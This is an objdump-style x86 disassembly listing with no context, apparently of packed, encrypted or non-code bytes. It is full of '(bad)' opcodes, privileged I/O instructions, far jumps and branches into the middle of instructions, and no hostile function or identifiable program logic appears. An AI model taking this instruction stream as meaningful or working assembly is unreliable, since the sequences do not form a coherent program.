  42e2b3:	or     BYTE PTR ds:[ebx-0x328ff1d0],0xd1
  42e2bb:	retf   
  42e2bc:	int    0xde
  42e2be:	mov    dh,0xb7
  42e2c0:	jmp    0x42e2f6
  42e2c2:	and    al,0x27
  42e2c4:	jge    0x42e2a1
  42e2c6:	push   ss
  42e2c7:	mov    dh,0x52
  42e2c9:	inc    esp
  42e2ca:	mov    bl,0xe4
  42e2cc:	and    al,0x1e
  42e2ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e2cf:	in     eax,0x68
  42e2d1:	push   es
  42e2d2:	pop    esi
  42e2d3:	lds    edi,FWORD PTR [esi+eax*2]
  42e2d6:	aas    
  42e2d7:	bound  ebx,QWORD PTR [esi+esi*8+0x170eae08]
  42e2de:	cdq    
  42e2df:	not    DWORD PTR [edx+eax*2]
  42e2e2:	pop    ss
  42e2e3:	jg     0x42e2a9
  42e2e5:	addr16 sar esp,0xf2
  42e2e9:	fcomp  DWORD PTR [ecx]
  42e2eb:	and    DWORD PTR [ecx-0x61],edx
  42e2ee:	lock xchg esp,eax
  42e2f0:	and    cl,BYTE PTR [edi-0x26baf3f2]
  42e2f6:	pushf  
  42e2f7:	stos   BYTE PTR es:[edi],al
  42e2f8:	mov    al,0x4b
  42e2fa:	je     0x42e302
  42e2fc:	pop    edx
  42e2fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e2fe:	xchg   ecx,eax
  42e2ff:	xchg   ebx,eax
  42e300:	dec    edi
  42e301:	add    al,0xe6
  42e303:	loop   0x42e374
  42e305:	loope  0x42e359
  42e307:	add    dh,dh
  42e309:	fld    DWORD PTR [ebp+0x33]
  42e30c:	mov    ds:0x8f9c0efb,al
  42e311:	dec    esi
  42e312:	rol    DWORD PTR [ebx],1
  42e314:	xchg   DWORD PTR [edx+0x6bb821af],ecx
  42e31a:	jl     0x42e35c
  42e31c:	hlt    
  42e31d:	jge    0x42e2e0
  42e31f:	jmp    0xd48a32eb
  42e324:	cdq    
  42e325:	and    eax,0x28da2d02
  42e32a:	jecxz  0x42e2ca
  42e32c:	pop    ds
  42e32d:	in     eax,dx
  42e32e:	retf   0xd903
  42e331:	fiadd  DWORD PTR [ebx+0x5]
  42e334:	dec    eax
  42e335:	(bad)  
  42e337:	pop    eax
  42e338:	and    eax,0xd6e9f613
  42e33d:	or     al,0x61
  42e33f:	sbb    BYTE PTR [edi-0x27ad29a6],bh
  42e345:	idiv   DWORD PTR [edx-0x67]
  42e348:	in     al,0x95
  42e34a:	mov    ch,0x30
  42e34c:	out    0x1b,eax
  42e34e:	adc    BYTE PTR [edx+0x69c453a6],cl
  42e354:	add    eax,0x69aece48
  42e359:	test   eax,0x70597ee0
  42e35e:	push   0x7262e196
  42e363:	(bad)  
  42e365:	mov    eax,ds:0xf518fb1c
  42e36a:	sub    BYTE PTR [ebp-0x5ce929eb],bh
  42e370:	sbb    DWORD PTR [eax-0x6e],ebx
  42e373:	mov    cl,BYTE PTR [edi]
  42e375:	push   edx
  42e376:	sbb    al,0x7c
  42e378:	mov    al,ds:0xdc41d731
  42e37d:	mov    ecx,0x1817d589
  42e382:	hlt    
  42e383:	mov    dh,0x9c
  42e385:	mov    eax,ds:0x23f501c5
  42e38a:	and    DWORD PTR [eax],edi
  42e38c:	jle    0x42e33c
  42e38e:	faddp  st(6),st
  42e390:	sbb    al,0xfb
  42e392:	mov    eax,0xddcba1d8
  42e397:	push   ebx
  42e398:	inc    ebx
  42e399:	mov    ebx,0xf8e24da7
  42e39e:	mov    eax,ds:0x13324284
  42e3a3:	sub    al,0xca
  42e3a5:	cld    
  42e3a6:	dec    ebp
  42e3a7:	jns    0x42e39e
  42e3a9:	mov    edx,0xf5c04c8d
  42e3ae:	mov    dl,0x97
  42e3b0:	push   es
  42e3b1:	fstp   TBYTE PTR [ebx]
  42e3b3:	ror    DWORD PTR [ebp+edx*4-0x19c3f23d],0xe8
  42e3bb:	shl    BYTE PTR [edx+0x4106f874],1
  42e3c1:	push   esp
  42e3c2:	ror    ebx,1
  42e3c4:	push   ecx
  42e3c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3c6:	stos   BYTE PTR es:[edi],al
  42e3c7:	shr    ecx,0xeb
  42e3ca:	mov    esp,0xdda76dba
  42e3cf:	mov    edi,0x1585b079
  42e3d4:	data16 loope 0x42e3ac
  42e3d7:	in     eax,dx
  42e3d8:	adc    al,0xd3
  42e3da:	mov    esi,0x412f13eb
  42e3df:	xor    BYTE PTR [edi-0xf004c84],cl
  42e3e5:	add    edx,esp
  42e3e7:	iret   
  42e3e8:	jle    0x42e39d
  42e3ea:	cmp    ecx,DWORD PTR [ebx+eax*2+0x3503db31]
  42e3f1:	pop    edi
  42e3f2:	cs mov dl,0x5e
  42e3f5:	or     cl,al
  42e3f7:	or     al,0xab
  42e3f9:	xor    al,0x39
  42e3fb:	icebp  
  42e3fc:	cmp    dh,BYTE PTR [esi]
  42e3fe:	fisubr DWORD PTR [ebp-0x791883d9]
  42e404:	push   ebx
  42e405:	xor    eax,0x20fa3670
  42e40a:	sub    al,0x95
  42e40c:	data16 jp 0x42e433
  42e40f:	lea    edx,[ecx-0x66]
  42e412:	repz cmp DWORD PTR [ebx+0x420bdc79],ebp
  42e419:	and    eax,0x6356d838
  42e41e:	aam    0xf7
  42e420:	or     ch,BYTE PTR [edi+eax*4+0x2b]
  42e424:	mov    cl,0x30
  42e426:	bound  edx,QWORD PTR [ecx-0xe]
  42e429:	call   0x343ca4cb
  42e42e:	aad    0x4c
  42e430:	(bad)  
  42e431:	xchg   ecx,eax
  42e432:	sbb    BYTE PTR [esi+0x4c],0xe2
  42e436:	push   0x8c813173
  42e43b:	xor    eax,0x49f7a0be
  42e440:	or     BYTE PTR [ebx-0x17777fa5],0xfb
  42e447:	les    ebx,FWORD PTR [edi-0x44ebe23e]
  42e44d:	loop   0x42e471
  42e44f:	xchg   ebp,eax
  42e450:	stc    
  42e451:	xchg   ebp,eax
  42e452:	in     al,dx
  42e453:	aad    0x4a
  42e455:	ins    DWORD PTR es:[edi],dx
  42e456:	pop    edi
  42e457:	or     cl,BYTE PTR [edx-0x7539ffa9]
  42e45d:	stos   BYTE PTR es:[edi],al
  42e45e:	cmp    ebx,ebx
  42e460:	pop    eax
  42e461:	outs   dx,BYTE PTR ds:[esi]
  42e462:	xor    al,0xbb
  42e464:	dec    ebx
  42e465:	ror    BYTE PTR [eax-0x74],cl
  42e468:	jo     0x42e48b
  42e46a:	stc    
  42e46b:	aam    0x32
  42e46d:	iret   
  42e46e:	adc    ah,BYTE PTR [ebp+0x1d38f185]
  42e474:	lods   al,BYTE PTR ds:[esi]
  42e475:	push   eax
  42e476:	dec    esp
  42e477:	ret    
  42e478:	mov    ecx,0x2cd5e634
  42e47d:	sbb    ebp,DWORD PTR [ebx-0x26]
  42e480:	xchg   edi,eax
  42e481:	loopne 0x42e4fc
  42e483:	pop    eax
  42e484:	sti    
  42e485:	mov    bh,0x64
  42e487:	dec    esp
  42e488:	sub    eax,0x2f914e4
  42e48d:	pop    ebp
  42e48e:	inc    edi
  42e48f:	out    0x27,eax
  42e491:	fs fist WORD PTR ss:[eax+ebp*4]
  42e496:	adc    eax,0x371322a6
  42e49b:	jae    0x42e497
  42e49d:	xlat   BYTE PTR ds:[ebx]
  42e49e:	jl     0x42e427
  42e4a0:	inc    edx
  42e4a1:	push   edx
  42e4a2:	sbb    al,0x4a
  42e4a4:	bound  esp,QWORD PTR ds:0xef1ddd84
  42e4aa:	(bad)  
  42e4ab:	fucomip st,st(6)
  42e4ad:	loop   0x42e44f
  42e4af:	aam    0x6d
  42e4b1:	pop    esp
  42e4b2:	outs   dx,BYTE PTR ds:[esi]
  42e4b3:	out    dx,al
  42e4b4:	fwait
  42e4b5:	sub    DWORD PTR [ebp+0x2217a334],edx
  42e4bb:	push   edx
  42e4bc:	(bad)  
  42e4bd:	mov    eax,0x211473c6
  42e4c2:	cmp    al,0x3
  42e4c4:	xchg   esi,eax
  42e4c5:	imul   ecx,DWORD PTR [ecx+0x72ea637d],0x886d0287
  42e4cf:	mov    bh,0x80
  42e4d1:	and    ebx,DWORD PTR [edi+0x19]
  42e4d4:	lock hlt 
  42e4d6:	hlt    
  42e4d7:	xlat   BYTE PTR ds:[ebx]
  42e4d8:	xlat   BYTE PTR ds:[ebx]
  42e4d9:	cmp    al,0x99
  42e4db:	dec    eax
  42e4dc:	and    bl,BYTE PTR [eax+0x2a]
  42e4df:	sbb    al,0x18
  42e4e1:	mov    edx,DWORD PTR [ebx+0x6c]
  42e4e4:	scas   al,BYTE PTR es:[edi]
  42e4e5:	mov    ebp,0xa98036ad
  42e4ea:	pop    esi
  42e4eb:	sub    eax,DWORD PTR [ecx*1-0x591d6087]
  42e4f2:	scas   eax,DWORD PTR es:[di]
  42e4f4:	cli    
  42e4f5:	mov    ah,0x5d
  42e4f7:	dec    ecx
  42e4f8:	pop    edx
  42e4f9:	aaa    
  42e4fa:	ss adc eax,0x8d5bf7eb
  42e500:	xlat   BYTE PTR ds:[ebx]
  42e501:	add    ebx,ebx
  42e503:	cmp    BYTE PTR [ebx+0x2c8aa80c],al
  42e509:	inc    esp
  42e50a:	jno    0x42e4d7
  42e50c:	sbb    eax,0x22b5de76
  42e511:	push   ebp
  42e512:	mov    bh,0x87
  42e514:	mov    ss,edi
  42e516:	mov    ch,0x7c
  42e519:	jbe    0x42e590
  42e51b:	pop    esi
  42e51c:	push   es
  42e51d:	add    ebx,DWORD PTR [eax]
  42e51f:	pop    ebp
  42e520:	aas    
  42e521:	fsubr  st(3),st
  42e523:	jae    0x42e4cd
  42e525:	push   edi
  42e526:	retf   0xd2e7
  42e529:	dec    esi
  42e52a:	in     eax,0xd6
  42e52c:	dec    edi
  42e52d:	push   eax
  42e52e:	call   0xc07105b6
  42e533:	dec    edi
  42e534:	imul   ebp,DWORD PTR [ebp+0x44],0xcb55bb30
  42e53b:	inc    esp
  42e53c:	xchg   ebp,eax
  42e53d:	xor    DWORD PTR [esi+0x79],esi
  42e540:	hlt    
  42e541:	in     al,0xe1
  42e543:	and    DWORD PTR [ecx+0x5aab3478],esi
  42e549:	pusha  
  42e54a:	arpl   WORD PTR [eax-0x55e56af4],sp
  42e550:	and    al,0xc3
  42e552:	outs   dx,BYTE PTR ds:[esi]
  42e554:	mov    gs,WORD PTR [edx-0x48]
  42e557:	mov    BYTE PTR [esi-0x76],bl
  42e55a:	mov    al,0xf5
  42e55c:	pop    ds
  42e55d:	icebp  
  42e55e:	inc    edx
  42e55f:	daa    
  42e560:	mov    bh,0x46
  42e562:	add    bl,BYTE PTR [eax+0x1e968309]
  42e568:	pop    esi
  42e569:	inc    eax
  42e56a:	adc    ch,BYTE PTR [ecx]
  42e56c:	popa   
  42e56d:	push   ss
  42e56e:	mov    ebp,0x162fb2fa
  42e573:	sbb    edi,DWORD PTR [eax+0x17]
  42e576:	shl    BYTE PTR ds:0xa0233408,0x2f
  42e57d:	test   al,0xad
  42e57f:	and    al,0xcd
  42e581:	sbb    BYTE PTR [edi],cl
  42e583:	aam    0x93
  42e585:	ret    0xbc5b
  42e588:	or     DWORD PTR [eax-0x4],eax
  42e58b:	in     eax,dx
  42e58c:	fwait
  42e58d:	retf   
  42e58e:	in     al,0xb6
  42e590:	cvtdq2ps xmm5,XMMWORD PTR [ecx-0x2c]
  42e594:	sti    
  42e595:	push   edi
  42e596:	sub    edx,DWORD PTR [ebx-0x1418f466]
  42e59c:	pop    ds
  42e59d:	ja     0x42e567
  42e59f:	xchg   DWORD PTR ds:0x3c74a6f0,edx
  42e5a5:	sub    ecx,ecx
  42e5a7:	and    eax,0xf27f3146
  42e5ac:	ror    BYTE PTR [edx],1
  42e5ae:	pop    eax
  42e5af:	repz enter 0xa023,0xce
  42e5b4:	mov    ecx,DWORD PTR [edi]
  42e5b6:	mul    BYTE PTR [edi+0x501ffeb2]
  42e5bc:	repnz pop edx
  42e5be:	inc    esp
  42e5bf:	mov    dh,0x6d
  42e5c1:	mov    ds:0xbf749e52,eax
  42e5c6:	mov    esi,0xf5ea8c5d
  42e5cb:	dec    edi
  42e5cc:	inc    esi
  42e5cd:	mov    edx,0xe957c8c9
  42e5d2:	js     0x42e580
  42e5d4:	push   edi
  42e5d5:	test   eax,0xee79de17
  42e5da:	retfw  
  42e5dc:	das    
  42e5dd:	test   eax,0xedb13e39
  42e5e2:	push   bp
  42e5e4:	jp     0x42e5ec
  42e5e6:	or     eax,0x60b1c473
  42e5eb:	mov    edx,0xb9f3e08f
  42e5f0:	mov    edi,0xd1a0c562
  42e5f5:	aad    0x5a
  42e5f7:	ficom  WORD PTR [ebp-0x3a]
  42e5fa:	cmp    ebx,eax
  42e5fc:	(bad)  
  42e5fd:	lds    edi,FWORD PTR [eax+0x41af9780]
  42e603:	pop    edx
  42e604:	idiv   ah
  42e606:	mov    ah,0x28
  42e608:	xchg   edx,eax
  42e609:	pop    ss
  42e60a:	jb     0x42e5aa
  42e60c:	jmp    0x975b:0x4b9ea823
  42e613:	xchg   esp,eax
  42e614:	push   esp
  42e615:	repz out dx,eax
  42e617:	sub    DWORD PTR [ecx+0x37],ebx
  42e61a:	jno    0x42e68f
  42e61c:	popf   
  42e61d:	jmp    0x5f96:0x7276f029
  42e624:	lods   al,BYTE PTR ds:[esi]
  42e625:	pop    ds
  42e626:	mov    fs,WORD PTR [edi-0xc]
  42e629:	les    esi,FWORD PTR [eax]
  42e62b:	ss (bad) 
  42e62d:	hlt    
  42e62e:	or     BYTE PTR [ebx-0x70],0xc1
  42e632:	repz (bad) 
  42e634:	mov    cl,0x63
  42e636:	fbld   TBYTE PTR [edx-0x42]
  42e639:	idiv   cl
  42e63b:	push   ebx
  42e63c:	fidivr WORD PTR [edx-0x3b]
  42e63f:	or     al,0x0
  42e641:	les    eax,FWORD PTR [ebp+ebp*1-0x2f]
  42e645:	adc    eax,0xf847d2e8
  42e64a:	imul   DWORD PTR [ebx]
  42e64c:	stc    
  42e64d:	aaa    
  42e64e:	outs   dx,DWORD PTR ds:[esi]
  42e64f:	push   0xffffffeb
  42e651:	jge    0x42e5f8
  42e653:	int3   
  42e654:	xor    esi,DWORD PTR [edi]
  42e656:	ss and al,0x2b
  42e659:	xor    eax,0x64a36ec8
  42e65e:	jne    0x42e604
  42e660:	popf   
  42e661:	jp     0x42e632
  42e663:	sbb    BYTE PTR [eax+0x2d39e66c],0x52
  42e66a:	push   esp
  42e66b:	mov    dl,BYTE PTR [ecx+0x4b715211]
  42e671:	test   al,0x89
  42e673:	fld    st(7)
  42e675:	adc    eax,0x9e8d368e
  42e67a:	mov    al,0x4b
  42e67c:	popa   
  42e67d:	fs and ebx,DWORD PTR cs:[eax+0x5]
  42e682:	or     eax,0x8e3fb260
  42e687:	cmp    al,0x1f
  42e689:	xchg   esi,eax
  42e68a:	push   ebp
  42e68c:	jecxz  0x42e60f
  42e68e:	std    
  42e68f:	push   es
  42e690:	test   DWORD PTR [edi],esp
  42e692:	xchg   ebp,eax
  42e693:	out    dx,eax
  42e694:	out    0x4b,al
  42e696:	sub    ebp,DWORD PTR [eax+edx*2-0x2]
  42e69a:	pop    ss
  42e69b:	jmp    0xefcb:0xbd0f443
  42e6a2:	lods   al,BYTE PTR ds:[esi]
  42e6a3:	sub    eax,0x5e6037a2
  42e6a8:	mov    WORD PTR [eax-0x60],?
  42e6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6ac:	lea    ebp,[ebx+0x67]
  42e6af:	jmp    0xc1452ee9
  42e6b4:	mov    cl,0x27
  42e6b6:	or     bl,dh
  42e6b8:	loope  0x42e643
  42e6ba:	jb     0x42e71e
  42e6bc:	test   ecx,esi
  42e6be:	sub    al,0xe9
  42e6c0:	or     al,0xf6
  42e6c2:	push   esi
  42e6c3:	daa    
  42e6c4:	add    cl,ah
  42e6c6:	pop    ss
  42e6c7:	add    dl,BYTE PTR ds:0x8dc7b6e
  42e6cd:	je     0x42e6c4
  42e6cf:	xor    ecx,DWORD PTR [esi-0x57]
  42e6d2:	push   edx
  42e6d3:	sub    ch,bl
  42e6d5:	and    al,0x55
  42e6d7:	sbb    edx,DWORD PTR [ecx]
  42e6d9:	adc    BYTE PTR [ecx+0x7435d484],ch
  42e6df:	xchg   esp,eax
  42e6e0:	cmp    DWORD PTR [esi+ecx*8],0x5b
  42e6e4:	sub    al,0xde
  42e6e6:	dec    ecx
  42e6e7:	call   0xa346e79a
  42e6ec:	or     al,cl
  42e6ee:	dec    eax
  42e6ef:	and    BYTE PTR [ecx],al
  42e6f1:	pop    eax
  42e6f2:	fdiv   DWORD PTR [ecx]
  42e6f4:	mov    ebp,0xf6b8b7de
  42e6f9:	lods   eax,DWORD PTR ds:[esi]
  42e6fa:	jp     0x42e731
  42e6fc:	inc    ecx
  42e6fd:	and    ecx,edx
  42e6ff:	fistp  WORD PTR ds:0x422a4a25
  42e705:	pushf  
  42e706:	or     ebp,DWORD PTR [ebp+0x41]
  42e709:	gs push edx
  42e70b:	into   
  42e70c:	push   es
  42e70d:	push   cs
  42e70e:	jbe    0x42e6d5
  42e710:	mov    ch,BYTE PTR [edx-0x7a79ebe0]
  42e716:	(bad)  
  42e717:	adc    ebx,DWORD PTR [esp+edi*4+0xe]
  42e71b:	xchg   ebx,eax
  42e71c:	mov    al,ds:0x18ca3570
  42e721:	push   es
  42e722:	retf   
  42e723:	add    ebx,DWORD PTR [ebx-0x7a0bfde2]
  42e729:	push   ebx
  42e72a:	pop    ebp
  42e72b:	dec    edi
  42e72c:	mov    ds:0x4f2f5914,eax
  42e731:	aas    
  42e732:	dec    eax
  42e733:	or     edx,DWORD PTR [edi+esi*2]
  42e736:	xor    edi,DWORD PTR [edx]
  42e738:	ja     0x42e746
  42e73a:	inc    ecx
  42e73b:	loop   0x42e715
  42e73d:	mov    ah,0x82
  42e73f:	(bad)  
  42e740:	cdq    
  42e741:	xchg   esi,eax
  42e742:	fwait
  42e743:	push   ecx
  42e744:	stos   BYTE PTR es:[edi],al
  42e745:	pmulhw mm5,QWORD PTR [edx+edi*8-0x22]
  42e74a:	cmp    BYTE PTR [edi-0x5c],bl
  42e74d:	inc    eax
  42e74e:	xor    eax,ebx
  42e750:	xchg   edx,eax
  42e751:	aam    0x1f
  42e753:	fs push si
  42e756:	icebp  
  42e757:	arpl   WORD PTR [edx+0x20],sp
  42e75a:	rcr    BYTE PTR [ebp+0x41242917],1
  42e760:	xchg   ebx,edx
  42e762:	add    al,0x4
  42e764:	out    dx,eax
  42e765:	pushf  
  42e766:	ficom  DWORD PTR [esp+ecx*2+0x24]
  42e76a:	js     0x42e787
  42e76c:	mov    ah,0xaf
  42e76e:	mov    DWORD PTR ds:0x531a0dc,esp
  42e774:	out    0x2a,al
  42e776:	mov    dh,0xc2
  42e778:	div    BYTE PTR [edx-0x2d]
  42e77b:	push   ecx
  42e77c:	ins    DWORD PTR es:[edi],dx
  42e77d:	rol    ebx,1
  42e77f:	aas    
  42e780:	loop   0x42e794
  42e782:	dec    ebp
  42e783:	(bad)  
  42e784:	jge    0x42e70b
  42e786:	pop    ss
  42e787:	cmp    ebx,0xdbc82a81
  42e78d:	aas    
  42e78e:	and    eax,0x63aeb672
  42e793:	jb     0x42e788
  42e795:	inc    eax
  42e796:	adc    al,0x20
  42e798:	push   esi
  42e799:	jl     0x42e7ec
  42e79b:	mov    ecx,0xb0f138bf
  42e7a0:	dec    eax
  42e7a1:	jmp    0x67262536
  42e7a6:	inc    ebp
  42e7a7:	xchg   esi,eax
  42e7a8:	cwde   
  42e7a9:	xor    DWORD PTR [edi-0x633c2979],0x72a3e3ab
  42e7b3:	cs pop esp
  42e7b5:	scas   al,BYTE PTR es:[edi]
  42e7b6:	sar    DWORD PTR [ebx+ecx*1],cl
  42e7b9:	stos   BYTE PTR es:[edi],al
  42e7ba:	stc    
  42e7bb:	xchg   ecx,eax
  42e7bc:	jmp    FWORD PTR [edi]
  42e7be:	dec    ecx
  42e7bf:	dec    ecx
  42e7c0:	mov    dl,0x68
  42e7c2:	xchg   ebx,eax
  42e7c3:	(bad)  [ecx+0x17]
  42e7c6:	ret    0xab3a
  42e7c9:	leave  
  42e7ca:	scas   eax,DWORD PTR es:[edi]
  42e7cb:	shl    BYTE PTR [ebx+ecx*1-0x3],1
  42e7cf:	xchg   edi,eax
  42e7d0:	pop    esi
  42e7d1:	sub    cl,bl
  42e7d3:	cmp    al,0x50
  42e7d5:	(bad)  
  42e7d6:	sub    ebx,eax
  42e7d8:	xchg   ecx,eax
  42e7d9:	mul    BYTE PTR [eax+0x7ddf7566]
  42e7df:	add    bh,ah
  42e7e1:	lods   al,BYTE PTR ds:[esi]
  42e7e2:	les    esp,FWORD PTR [esi-0x1e]
  42e7e5:	push   edi
  42e7e6:	out    0x51,al
  42e7e8:	mov    ebx,0x5259c8c
  42e7ed:	scas   al,BYTE PTR es:[edi]
  42e7ee:	or     al,0xad
  42e7f0:	add    edi,DWORD PTR [ebp-0x5acbf6e3]
  42e7f6:	lods   eax,DWORD PTR ds:[esi]
  42e7f7:	std    
  42e7f8:	sub    DWORD PTR [ebx+edx*8+0x21],ecx
  42e7fc:	pop    ds
  42e7fd:	dec    esi
  42e7fe:	xor    ah,al
  42e800:	int3   
  42e801:	sbb    al,0x36
  42e803:	sub    eax,0x41615ec2
  42e808:	adc    eax,0x54bfece6
  42e80d:	ror    BYTE PTR [ebp+edi*4-0x3d],0xd1
  42e812:	pop    ebp
  42e813:	dec    esi
  42e814:	out    dx,eax
  42e815:	push   0x75
  42e817:	es pop ebx
  42e819:	ret    0x10e6
  42e81c:	into   
  42e81d:	pop    ds
  42e81e:	dec    ecx
  42e81f:	(bad)  
  42e820:	cmp    DWORD PTR [ebx],eax
  42e822:	and    DWORD PTR [ecx+0x12],0x59bdd1d0
  42e829:	inc    edx
  42e82a:	lahf   
  42e82b:	repz sub DWORD PTR [edx-0xb6d3e8a],ebp
  42e832:	leave  
  42e833:	mov    ah,0xfe
  42e835:	loopne 0x42e7e2
  42e837:	or     BYTE PTR [eax-0x4f],0x66
  42e83b:	in     al,0xd8
  42e83d:	es xchg esi,eax
  42e83f:	or     al,0x3d
  42e841:	push   ebp
  42e842:	mov    esp,0x9de97732
  42e847:	sti    
  42e848:	hlt    
  42e849:	std    
  42e84a:	test   BYTE PTR [ebx+ecx*1+0x40],dh
  42e84e:	inc    ebp
  42e84f:	cld    
  42e850:	ja     0x42e80f
  42e852:	lds    edi,FWORD PTR [ebx+0x2371d396]
  42e858:	jmp    0x761a35c7
  42e85d:	adc    eax,esp
  42e85f:	add    DWORD PTR [esi+0x72],ecx
  42e862:	pushf  
  42e863:	xchg   esi,eax
  42e864:	push   ss
  42e865:	mov    edi,esp
  42e867:	loope  0x42e8ab
  42e869:	jecxz  0x42e86c
  42e86b:	imul   edi,DWORD PTR [ecx-0xd0d209],0xffffffaf
  42e872:	adc    esi,ebp
  42e874:	es jb  0x42e8ba
  42e877:	and    DWORD PTR [ecx],esi
  42e879:	into   
  42e87a:	pusha  
  42e87b:	jmp    0x655:0xe963c5fd
  42e882:	mov    cl,0xe2
  42e884:	test   eax,0x1ac7bd60
  42e889:	fidivr WORD PTR [ecx+edx*1]
  42e88c:	lahf   
  42e88d:	arpl   WORD PTR [eax+0x25],cx
  42e890:	jbe    0x42e843
  42e892:	mov    esi,0x8d11c60
  42e897:	cmc    
  42e898:	xchg   edi,eax
  42e899:	and    eax,0xcd9b9b0d
  42e89e:	adc    al,bh
  42e8a0:	mov    al,ds:0x25a16606
  42e8a5:	and    ebp,esi
  42e8a7:	lods   al,BYTE PTR ds:[esi]
  42e8a8:	loope  0x42e856
  42e8aa:	test   DWORD PTR [eax+0xf30d1e3],edx
  42e8b0:	(bad)  
  42e8b1:	call   0x4c5e68d
  42e8b6:	dec    ecx
  42e8b7:	imul   esi,DWORD PTR [ebx-0x66],0x3b5d1d47
  42e8be:	in     al,0x4
  42e8c0:	pushf  
  42e8c1:	aam    0xcd
  42e8c3:	or     ah,dh
  42e8c5:	stos   BYTE PTR es:[edi],al
  42e8c6:	adc    al,0xcf
  42e8c8:	sbb    eax,0xefd60a62
  42e8cd:	call   0xa0d2e172
  42e8d2:	std    
  42e8d3:	(bad)  
  42e8d4:	(bad)  
  42e8d5:	dec    ecx
  42e8d6:	fisubr WORD PTR [eax]
  42e8d8:	fild   WORD PTR [ebp-0x5d596853]
  42e8de:	fwait
  42e8df:	leave  
  42e8e0:	cld    
  42e8e1:	cmp    BYTE PTR [eax],0x28
  42e8e4:	xor    dl,dh
  42e8e6:	sub    DWORD PTR [edi-0x7de073bd],ebp
  42e8ec:	pop    ebp
  42e8ed:	in     al,0xef
  42e8ef:	fsub   DWORD PTR [eax-0x7b]
  42e8f2:	aaa    
  42e8f3:	or     ebp,DWORD PTR [eax+0x2ff23749]
  42e8f9:	rcl    DWORD PTR [ebx*1-0xfb2b83],0xa5
  42e901:	in     al,0x1e
  42e903:	inc    edi
  42e904:	and    edi,DWORD PTR ds:0xe5f88fed
  42e90a:	bound  edi,QWORD PTR [edi+0xb]
  42e90d:	(bad)  
  42e90e:	and    esp,ebp
  42e910:	in     eax,0x62
  42e912:	fdiv   QWORD PTR [edi-0x13]
  42e915:	cmp    BYTE PTR [eax+0x5c1c5ae6],0xa1
  42e91c:	je     0x42e8d8
  42e91e:	or     DWORD PTR [esi],eax
  42e920:	lods   eax,DWORD PTR ds:[esi]
  42e921:	imul   esp,eax,0x7f
  42e924:	lods   eax,DWORD PTR ds:[esi]
  42e925:	mov    edi,0x2eb58cee
  42e92a:	sbb    ebx,DWORD PTR [edi]
  42e92c:	test   al,0xfc
  42e92e:	in     eax,dx
  42e92f:	cmp    dl,BYTE PTR [ebx]
  42e931:	out    dx,al
  42e932:	and    edx,DWORD PTR gs:[edi-0x62af0188]
  42e939:	jecxz  0x42e992
  42e93b:	inc    esi
  42e93c:	shl    DWORD PTR ds:0x921ffa80,0xca
  42e943:	int    0x3d
  42e945:	(bad)
  42e948:	mov    ebp,0x5f197110
  42e94e:	pop    esi
  42e94f:	xchg   DWORD PTR [eax],eax
  42e951:	aas    
  42e952:	out    dx,al
  42e953:	es cmc 
  42e955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e956:	test   DWORD PTR [esi-0x72a89488],ebp
  42e95c:	iret   
  42e95d:	or     al,0x3
  42e95f:	mov    DWORD PTR [eax],0xa8714f77
  42e965:	mov    ds:0xe71c2caa,eax
  42e96a:	aas    
  42e96b:	retf   0x4c66
  42e96e:	fs inc esi
  42e970:	jo     0x42e927
  42e972:	push   ss
  42e973:	loope  0x42e9a4
  42e975:	mov    esp,0xdc2b4cb9
  42e97a:	cmp    bh,BYTE PTR [ecx+edx*2]
  42e97d:	popf   
  42e97e:	sub    ah,al
  42e980:	mov    bl,BYTE PTR [ebp-0x7126872d]
  42e986:	add    DWORD PTR [edx+0x6c],esp
  42e989:	data16 xor bh,BYTE PTR [edx-0x20a1d24b]
  42e990:	adc    edi,DWORD PTR [edi+0x5a0f2d6]
  42e996:	add    DWORD PTR [ecx],esp
  42e998:	jae    0x42e91e
  42e99a:	xchg   ebx,eax
  42e99b:	push   ecx
  42e99c:	hlt    
  42e99d:	push   ebp
  42e99e:	sar    BYTE PTR ds:0x3110aade,cl
  42e9a4:	aaa    
  42e9a5:	aas    
  42e9a6:	sbb    BYTE PTR [ecx],cl
  42e9a8:	pop    edx
  42e9a9:	pop    eax
  42e9aa:	push   edi
  42e9ab:	or     eax,0x5289578a
  42e9b0:	fisub  DWORD PTR [edi]
  42e9b2:	xor    BYTE PTR ds:0xa3278b0a,bl
  42e9b8:	xor    al,0x7c
  42e9ba:	inc    eax
  42e9bb:	nop
  42e9bc:	fidivr WORD PTR [ecx+0x3121fc37]
  42e9c2:	inc    esp
  42e9c3:	loop   0x42e9f3
  42e9c5:	cmp    eax,0xa9e473f9
  42e9ca:	ret    0xdb94
  42e9cd:	mov    dl,0xf8
  42e9cf:	or     al,0x6d
  42e9d1:	inc    esp
  42e9d2:	imul   eax,DWORD PTR [edx-0x11],0xcf512f3c
  42e9d9:	pop    edx
  42e9da:	call   0x5c4c:0x630af80
  42e9e1:	pop    ebp
  42e9e2:	mov    ds:0x28b8eb49,eax
  42e9e7:	inc    esi
  42e9e8:	inc    eax
  42e9e9:	inc    ecx
  42e9ea:	or     al,0x5d
  42e9ec:	xchg   esi,eax
  42e9ed:	jne    0x42e9a7
  42e9ef:	push   ds
  42e9f0:	das    
  42e9f1:	xchg   edi,eax
  42e9f2:	cmc    
  42e9f3:	jp     0x42e9a9
  42e9f5:	mov    ebx,0x98c031a6
  42e9fa:	inc    esi
  42e9fb:	(bad)  
  42e9fc:	jbe    0x42e9f3
  42e9fe:	inc    esp
  42e9ff:	sbb    esi,DWORD PTR [edi-0x6a360709]
  42ea05:	push   ebp
  42ea06:	sbb    eax,0x606009d7
  42ea0b:	into   
  42ea0c:	pop    edi
  42ea0d:	in     al,0xa3
  42ea0f:	test   eax,0xe75f1b6
  42ea14:	rcl    DWORD PTR [esi+0x31b68245],cl
  42ea1a:	lods   eax,DWORD PTR ds:[esi]
  42ea1b:	push   edx
  42ea1c:	fst    QWORD PTR [edi-0x3a]
  42ea1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ea20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea21:	mov    esi,0x8b411069
  42ea26:	or     BYTE PTR [esi],dh
  42ea28:	rcr    DWORD PTR [edi+esi*8+0xfcbcf4a],cl
  42ea2f:	aas    
  42ea30:	pop    esp
  42ea31:	pop    ebx
  42ea32:	dec    ebx
